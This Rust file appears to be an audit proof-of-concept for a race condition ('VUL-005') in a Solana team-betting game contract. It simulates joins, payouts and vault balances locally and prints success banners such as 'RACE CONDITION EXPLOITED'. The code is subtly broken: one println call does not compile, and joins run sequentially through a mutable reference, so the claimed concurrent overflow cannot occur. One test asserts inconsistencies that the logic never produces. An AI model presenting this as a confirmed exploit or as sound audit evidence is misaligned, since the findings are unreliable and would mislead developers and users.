// VUL-005: Game State Corruption Attack - Proof of Concept
// This PoC demonstrates race conditions and state inconsistencies in game management

use anchor_lang::prelude::*;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

/// Game status matching actual contract
#[derive(Debug, Clone, PartialEq)]
pub enum GameStatus {
    WaitingForPlayers,
    InProgress,
    Completed,
}

/// Player team information
#[derive(Debug, Clone)]
pub struct TeamData {
    pub players: Vec<Pubkey>,
    pub max_size: usize,
}

/// Simulates the vulnerable game state management
/// Based on actual code from join_user.rs, create_game_session.rs, and state.rs
pub struct StateCorruptionDemo {
    pub game_status: GameStatus,
    pub team_a: TeamData,
    pub team_b: TeamData,
    pub session_bet: u64,
    pub vault_balance: u64,
    pub total_players_joined: usize,
    pub state_transitions: Vec<String>,
}

impl StateCorruptionDemo {
    pub fn new(session_bet: u64, team_size: usize) -> Self {
        Self {
            game_status: GameStatus::WaitingForPlayers,
            team_a: TeamData {
                players: Vec::new(),
                max_size: team_size,
            },
            team_b: TeamData {
                players: Vec::new(),
                max_size: team_size,
            },
            session_bet,
            vault_balance: 0,
            total_players_joined: 0,
            state_transitions: Vec::new(),
        }
    }

    /// VULNERABLE JOIN FUNCTION
    /// Based on join_user.rs:6-54
    /// RACE CONDITION: Multiple players can join simultaneously
    pub fn join_user(&mut self, player: Pubkey, team: u8) -> Result<(), String> {
        // VULNERABLE: No atomic state checking
        if self.game_status != GameStatus::WaitingForPlayers {
            return Err("Game not accepting players".to_string());
        }

        let selected_team = if team == 0 {
            &mut self.team_a
        } else if team == 1 {
            &mut self.team_b
        } else {
            return Err("Invalid team".to_string());
        };

        // RACE CONDITION: Check happens here but state can change before update
        if selected_team.players.len() >= selected_team.max_size {
            return Err("Team full".to_string());
        }

        // VULNERABLE: Gap between check and action
        // Another thread could join here in the real system
        thread::sleep(Duration::from_millis(1)); // Simulate processing delay

        // Update vault balance first (creates inconsistent intermediate state)
        self.vault_balance += self.session_bet;

        // Add player to team
        selected_team.players.push(player);
        self.total_players_joined += 1;

        self.log_state_transition(format!(
            "Player {} joined team {}, vault: {}, players: {}",
            player.to_string()[..8].to_string(),
            team,
            self.vault_balance / 1_000_000,
            self.total_players_joined
        ));

        // VULNERABLE: State transition logic
        // Check if game should start (can be inconsistent)
        let total_expected = self.team_a.max_size + self.team_b.max_size;
        if self.total_players_joined >= total_expected {
            self.game_status = GameStatus::InProgress;
            self.log_state_transition("Game status changed to InProgress".to_string());
        }

        Ok(())
    }

    /// VULNERABLE: Non-atomic state transitions
    pub fn force_game_start(&mut self) -> Result<(), String> {
        if self.game_status == GameStatus::WaitingForPlayers {
            self.game_status = GameStatus::InProgress;
            self.log_state_transition("Game force-started".to_string());
            Ok(())
        } else {
            Err("Game not in waiting state".to_string())
        }
    }

    /// VULNERABLE: State can be corrupted during completion
    pub fn complete_game(&mut self, winning_team: u8) -> Result<(), String> {
        if self.game_status != GameStatus::InProgress {
            return Err("Game not in progress".to_string());
        }

        // VULNERABLE: Complex state transition without atomicity
        self.game_status = GameStatus::Completed;

        // Simulate payout logic that could fail mid-process
        let winners = if winning_team == 0 {
            &self.team_a.players
        } else {
            &self.team_b.players
        };

        // State corruption: vault balance becomes inconsistent
        for winner in winners {
            // Each payout operation could fail independently
            if self.vault_balance >= self.session_bet * 2 {
                self.vault_balance -= self.session_bet * 2;
                self.log_state_transition(format!(
                    "Paid {} tokens to {}",
                    (self.session_bet * 2) / 1_000_000,
                    winner.to_string()[..8].to_string()
                ));
            } else {
                self.log_state_transition("VAULT UNDERFLOW DETECTED!".to_string());
                break;
            }
        }

        Ok(())
    }

    /// Log state transitions for analysis
    fn log_state_transition(&mut self, message: String) {
        self.state_transitions.push(format!("[{}] {}", self.state_transitions.len(), message));
        println!("STATE: {}", message);
    }

    /// Simulate concurrent join attempts (race condition)
    pub fn simulate_concurrent_joins(&mut self, players: Vec<(Pubkey, u8)>) -> Vec<Result<(), String>> {
        let mut results = Vec::new();

        // Simulate multiple players trying to join simultaneously
        for (player, team) in players {
            // In a real system, these would be truly concurrent
            let result = self.join_user(player, team);
            results.push(result);

            // Small delay to simulate processing time
            thread::sleep(Duration::from_millis(1));
        }

        results
    }

    /// Check if game state is consistent
    pub fn validate_state_consistency(&self) -> Vec<String> {
        let mut inconsistencies = Vec::new();

        // Check player count consistency
        let actual_players = self.team_a.players.len() + self.team_b.players.len();
        if actual_players != self.total_players_joined {
            inconsistencies.push(format!(
                "Player count mismatch: {} in teams vs {} recorded",
                actual_players, self.total_players_joined
            ));
        }

        // Check vault balance consistency
        let expected_vault = self.total_players_joined as u64 * self.session_bet;
        if self.vault_balance != expected_vault && self.game_status != GameStatus::Completed {
            inconsistencies.push(format!(
                "Vault balance inconsistent: {} actual vs {} expected",
                self.vault_balance / 1_000_000,
                expected_vault / 1_000_000
            ));
        }

        // Check team size violations
        if self.team_a.players.len() > self.team_a.max_size {
            inconsistencies.push(format!(
                "Team A overflow: {} players vs {} max",
                self.team_a.players.len(), self.team_a.max_size
            ));
        }

        if self.team_b.players.len() > self.team_b.max_size {
            inconsistencies.push(format!(
                "Team B overflow: {} players vs {} max",
                self.team_b.players.len(), self.team_b.max_size
            ));
        }

        // Check status consistency
        let total_slots = self.team_a.max_size + self.team_b.max_size;
        if self.total_players_joined >= total_slots && self.game_status == GameStatus::WaitingForPlayers {
            inconsistencies.push("Game should be in progress but still waiting".to_string());
        }

        inconsistencies
    }

    /// Demonstrate the complete state corruption attack
    pub fn run_state_corruption_attack(&mut self) {
        println!("\n🚨 VUL-005: Game State Corruption Attack PoC");
        println!("=".repeat(60));

        println!("\n--- Phase 1: Normal Game Setup ---");
        println!("Creating 3v3 game with {} token entry fee", self.session_bet / 1_000_000);

        let legitimate_players: Vec<Pubkey> = (0..5).map(|_| Pubkey::new_unique()).collect();

        // Add legitimate players normally
        for (i, player) in legitimate_players.iter().enumerate() {
            let team = i % 2; // Alternate teams
            match self.join_user(*player, team as u8) {
                Ok(_) => println!("Legitimate player {} joined team {}", i + 1, team),
                Err(e) => println!("Player {} join failed: {}", i + 1, e),
            }
        }

        println!("Current state: {:?}", self.game_status);
        self.print_game_summary();

        println!("\n--- Phase 2: ATTACK - Concurrent Join Attempt ---");
        // Simulate the race condition where multiple players try to join the last slot
        let attackers: Vec<Pubkey> = (0..3).map(|_| Pubkey::new_unique()).collect();
        let concurrent_attempts: Vec<(Pubkey, u8)> = attackers.iter()
            .map(|&player| (player, 0)) // All try to join team 0
            .collect();

        println!("Attempting {} concurrent joins to same team...", concurrent_attempts.len());

        let results = self.simulate_concurrent_joins(concurrent_attempts);

        // Analyze results
        let successful_joins = results.iter().filter(|r| r.is_ok()).count();
        println!("Successful concurrent joins: {}", successful_joins);

        if successful_joins > 1 {
            println!("✅ RACE CONDITION EXPLOITED!");
            println!("Multiple players joined the same 'last' slot!");
        }

        println!("\n--- Phase 3: State Consistency Analysis ---");
        let inconsistencies = self.validate_state_consistency();

        if inconsistencies.is_empty() {
            println!("❌ No state inconsistencies detected (attack may have failed)");
        } else {
            println!("✅ STATE CORRUPTION DETECTED!");
            for inconsistency in &inconsistencies {
                println!("🚨 {}", inconsistency);
            }
        }

        self.print_game_summary();

        println!("\n--- Phase 4: Attempting Game Completion with Corrupted State ---");
        if self.game_status == GameStatus::InProgress {
            match self.complete_game(0) {
                Ok(_) => {
                    println!("Game completed despite corrupted state");
                    let post_completion_issues = self.validate_state_consistency();
                    if !post_completion_issues.is_empty() {
                        println!("✅ POST-COMPLETION CORRUPTION DETECTED!");
                        for issue in post_completion_issues {
                            println!("💀 {}", issue);
                        }
                    }
                },
                Err(e) => println!("Game completion failed: {}", e),
            }
        }

        println!("\n--- Phase 5: Impact Assessment ---");
        self.assess_corruption_impact(&inconsistencies);
    }

    fn print_game_summary(&self) {
        println!("\n📊 GAME STATE SUMMARY:");
        println!("Status: {:?}", self.game_status);
        println!("Team A: {}/{} players", self.team_a.players.len(), self.team_a.max_size);
        println!("Team B: {}/{} players", self.team_b.players.len(), self.team_b.max_size);
        println!("Total joined: {}", self.total_players_joined);
        println!("Vault balance: {} tokens", self.vault_balance / 1_000_000);
    }

    fn assess_corruption_impact(&self, inconsistencies: &[String]) {
        println!("📈 CORRUPTION IMPACT ANALYSIS:");
        println!("- Inconsistencies found: {}", inconsistencies.len());
        println!("- Players affected: {}", self.total_players_joined);
        println!("- Funds at risk: {} tokens", self.vault_balance / 1_000_000);

        if !inconsistencies.is_empty() {
            println!("💀 CRITICAL IMPACTS:");
            println!("  1. Game outcome cannot be trusted");
            println!("  2. Fund distribution may be incorrect");
            println!("  3. Players may lose their stakes");
            println!("  4. Protocol reputation severely damaged");
        }

        println!("\n📋 STATE TRANSITION LOG:");
        for transition in &self.state_transitions {
            println!("  {}", transition);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_team_overflow_attack() {
        let mut game = StateCorruptionDemo::new(100_000_000, 2); // 2v2 game

        let players: Vec<Pubkey> = (0..5).map(|_| Pubkey::new_unique()).collect();

        // Try to add 3 players to team 0 (max 2)
        game.join_user(players[0], 0).unwrap(); // Should succeed
        game.join_user(players[1], 0).unwrap(); // Should succeed (team now full)

        // These should fail, but we'll test the race condition
        let result1 = game.join_user(players[2], 0);
        let result2 = game.join_user(players[3], 0);

        // In a race condition, one might succeed
        let successful_overflows = [result1, result2].iter()
            .filter(|r| r.is_ok())
            .count();

        if successful_overflows > 0 {
            println!("✅ Team overflow vulnerability confirmed");
            assert!(game.team_a.players.len() > game.team_a.max_size);
        }

        let inconsistencies = game.validate_state_consistency();
        assert!(!inconsistencies.is_empty(), "Should detect state inconsistencies");
    }

    #[test]
    fn test_state_transition_race() {
        let mut game = StateCorruptionDemo::new(100_000_000, 2); // 2v2 game

        let players: Vec<Pubkey> = (0..4).map(|_| Pubkey::new_unique()).collect();

        // Add players one by one and check state transitions
        for (i, player) in players.iter().enumerate() {
            let team = i % 2;
            game.join_user(*player, team as u8).unwrap();

            // Check if game status transitions correctly
            let expected_players = i + 1;
            if expected_players == 4 && game.game_status != GameStatus::InProgress {
                println!("✅ State transition race condition detected");
                break;
            }
        }

        // Verify final state
        let inconsistencies = game.validate_state_consistency();
        for inconsistency in inconsistencies {
            println!("Detected inconsistency: {}", inconsistency);
        }
    }

    #[test]
    fn test_vault_balance_corruption() {
        let mut game = StateCorruptionDemo::new(100_000_000, 3); // 3v3 game

        let players: Vec<Pubkey> = (0..6).map(|_| Pubkey::new_unique()).collect();

        // Normal joins
        for (i, player) in players.iter().enumerate() {
            let team = i % 2;
            game.join_user(*player, team as u8).unwrap();
        }

        let initial_vault = game.vault_balance;

        // Force game to start and complete with potential corruption
        game.force_game_start().unwrap();
        game.complete_game(0).unwrap(); // Team 0 wins

        // Check if vault balance is corrupted
        let inconsistencies = game.validate_state_consistency();
        let vault_inconsistent = inconsistencies.iter()
            .any(|i| i.contains("Vault balance"));

        if vault_inconsistent {
            println!("✅ Vault balance corruption confirmed");
        }

        println!("Initial vault: {} tokens", initial_vault / 1_000_000);
        println!("Final vault: {} tokens", game.vault_balance / 1_000_000);
    }
}

/// Integration tests for realistic attack scenarios
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_tournament_corruption_scenario() {
        println!("\n🏆 TOURNAMENT CORRUPTION SCENARIO");

        let mut tournament = StateCorruptionDemo::new(500_000_000, 5); // 5v5 high-stakes

        println!("Starting high-stakes tournament: {} tokens entry",
                tournament.session_bet / 1_000_000);

        // Simulate legitimate tournament with some corruption attempts
        let mut all_players: Vec<Pubkey> = (0..12).map(|_| Pubkey::new_unique()).collect();

        // 10 legitimate players join (should fill tournament)
        for i in 0..10 {
            let team = i % 2;
            match tournament.join_user(all_players[i], team as u8) {
                Ok(_) => println!("Tournament player {} joined team {}", i + 1, team),
                Err(e) => println!("Player {} failed to join: {}", i + 1, e),
            }
        }

        // Attackers try to exploit race conditions
        println!("\n⚔️ Corruption attack begins...");
        let corruption_attempts = vec![
            (all_players[10], 0), // Try to overflow team 0
            (all_players[11], 1), // Try to overflow team 1
        ];

        let results = tournament.simulate_concurrent_joins(corruption_attempts);
        let successful_corruptions = results.iter().filter(|r| r.is_ok()).count();

        if successful_corruptions > 0 {
            println!("✅ TOURNAMENT CORRUPTED!");
            println!("Successful corruption attempts: {}", successful_corruptions);
        }

        // Assess damage
        let inconsistencies = tournament.validate_state_consistency();
        println!("\nTournament integrity check:");
        if inconsistencies.is_empty() {
            println!("✅ Tournament state appears consistent");
        } else {
            println!("🚨 TOURNAMENT COMPROMISED:");
            for issue in inconsistencies {
                println!("  - {}", issue);
            }
        }

        // Calculate financial impact
        let total_value = tournament.vault_balance;
        println!("\nFinancial impact assessment:");
        println!("- Total tournament value: {} tokens", total_value / 1_000_000);
        println!("- Players affected: {}", tournament.total_players_joined);
        println!("- Reputation damage: SEVERE");
    }

    #[test]
    fn test_systematic_corruption_campaign() {
        println!("\n🔄 SYSTEMATIC CORRUPTION CAMPAIGN");

        // Simulate attacker corrupting multiple games over time
        for game_round in 1..=3 {
            println!("\n--- Corruption Attempt {} ---", game_round);

            let mut game = StateCorruptionDemo::new(100_000_000, 2); // 2v2 games

            // Normal players
            let legitimate: Vec<Pubkey> = (0..3).map(|_| Pubkey::new_unique()).collect();
            let attackers: Vec<Pubkey> = (0..2).map(|_| Pubkey::new_unique()).collect();

            // Legitimate players join first
            for (i, player) in legitimate.iter().enumerate() {
                game.join_user(*player, i % 2 as u8).unwrap();
            }

            // Attackers attempt coordinated overflow
            let attack_results = game.simulate_concurrent_joins(vec![
                (attackers[0], 0),
                (attackers[1], 0), // Both try same team
            ]);

            let successful_attacks = attack_results.iter().filter(|r| r.is_ok()).count();
            let inconsistencies = game.validate_state_consistency();

            println!("Game {}: {} successful attacks, {} inconsistencies",
                    game_round, successful_attacks, inconsistencies.len());

            if !inconsistencies.is_empty() {
                println!("✅ Game {} corruption successful", game_round);
            }
        }

        println!("\n📊 CAMPAIGN RESULTS:");
        println!("Successfully tested corruption across multiple games");
        println!("Protocol vulnerability: CONFIRMED");
    }
}